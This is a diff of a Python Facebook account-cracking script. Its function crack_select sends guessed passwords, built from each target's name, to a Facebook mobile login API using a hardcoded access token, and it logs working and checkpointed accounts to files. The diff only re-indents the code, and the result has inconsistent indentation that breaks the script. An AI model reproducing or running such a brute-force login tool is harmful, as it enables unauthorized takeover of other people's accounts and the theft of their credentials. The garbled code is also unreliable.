@@ -438,7 +438,7 @@ def crack_select():
 															cp.close()
 															cps.append(uid+pass6)
 														else:
-														  pass7 = name.lower()+p1  
+														        pass7 = name.lower()+p1  
 															
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
@@ -448,31 +448,31 @@ def crack_select():
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
-															else:
+															 else:
 																if "www.facebook.com" in q["error_msg"]:
 																	print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("SYED-ZADAcp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
 																	cps.append(uid+pass7)
-																else:
-														  pass8 = name.lower()+p1  
+															      else:
+														                         pass8 = name.lower()+p1  
 															
-															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-															q = json.loads(data)
-															if "access_token" in q:
-																print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass8+"\033[0;97m")
-																ok = open("SYED-ZADAok.txt", "a")
-																ok.write(uid+"|"+pass8+"\n")
-																ok.close()
-																oks.append(uid+pass8)
-															else:
-																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass8+"\033[0;97m")
-																	cp = open("SYED-ZADAcp.txt", "a")
-																	cp.write(uid+"|"+pass8+"\n")
-																	cp.close()
-																	cps.append(uid+pass8)	
+															                 data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+															                 q = json.loads(data)
+															                 if "access_token" in q:
+																                 print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass8+"\033[0;97m")
+																                 ok = open("SYED-ZADAok.txt", "a")
+																                 ok.write(uid+"|"+pass8+"\n")
+																                 ok.close()
+																                 oks.append(uid+pass8)
+															          else:
+																         if "www.facebook.com" in q["error_msg"]:
+																	 print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass8+"\033[0;97m")
+																	 cp = open("SYED-ZADAcp.txt", "a")
+																	 cp.write(uid+"|"+pass8+"\n")
+																	 cp.close()
+																	 cps.append(uid+pass8)	
 																	
 		except:
 			pass
